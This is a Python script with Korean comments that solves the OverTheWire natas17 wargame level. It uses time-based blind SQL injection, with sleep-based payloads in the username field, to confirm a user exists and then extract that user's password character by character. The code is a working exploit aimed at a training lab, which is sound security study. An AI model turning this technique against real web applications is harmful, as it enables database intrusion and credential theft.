import requests
import string


url = "http://natas17.natas.labs.overthewire.org/"
# 여기에는 전 단계에서 구한 natas17 비밀번호 변수에 대입
natas17_cred = ""

s = requests.Session()
s.auth = ("natas17", natas17_cred)

username = "natas18"
threshold = 3.5

# username이 실제 DB에 있는 값인지 검증
def username_valid(username, threshold):
  payload = f'{username}" AND IF(username="{username}",sleep({threshold}), 0) #' 
  data = {"username": payload, "submit": "Check existence"}
  
  #timeout을 이용하여 요청 시간보다 threshold가 크면 time_based_sqli가 통해서 타임아웃이 난 것임으로 해당 계정이 있는 것이다.  
  try:
    s.post(url, data=data, timeout=2)
    return None
  except requests.exceptions.Timeout:
    return username
  
# 유저에 대한 비밀번호 time_based_sqli를 통해, 맞는 문자열을 넣고 반응을 통해 참인 문자열을 얻음
def time_base_sqli_exploit(user):
  char_set = string.ascii_letters + string.digits
  password = ""
  
  # blind_sqlI 처럼 문자열 마다 반응을 보고 판단해야 해서 반복문을 통해 만들어놓은 cher_set을 하나씩 대입하면서 문자 찾음
  for i in range(1, 33):
    for ch in char_set:
      payload = f'{username}" AND IF(substr(password, {i}, 1) = BINARY "{ch}", sleep({threshold}), 0) #'
      
      data = {"username":payload, "submit":"Check existence"}
      
      # 위 로직처럼 except문에서 timeout이 일어나면 비밀번호에 해당하는 문자열이 맞기 때문에, password에 문자열을 추가 
      try:
        s.post(url, data=data, timeout=2)
      except requests.exceptions.Timeout:
        password += ch
        print(f"[*][{i}자리 비밀번호] {password}")
        break 
    
  return password    

# DB의 유저를 찾는 함수를 실행시킨 return갑을 user 변수에 대입
user = username_valid(username, threshold)

# 해당 함수 실행해서 맞는지 여부 한 번 더 검증(오류나 문제점 찾기를 위한 2차 거름망)
if user:
  print("="* 60)
  print(f"[+]SQLI가 가능한 DB에 존재하는 유효한값 입니다 ===> {user}")
  print("="* 60)
else:
  print("[-]유효하지 않은 유저, 바꿔서 재시도")

# DB에 있는 제대로된 user가 맞다면 res_pasword에 해당 비밀번호 담아서 최종 출력
res_password = ""

if user == None:
  print("[-]아이디부터 다시 구하세요")
else:
  res_password = time_base_sqli_exploit(user)
  print("="* 60)
  print(f"[+]natas18의 비밀번호는 ===> {res_password}")
  print("="*60)  
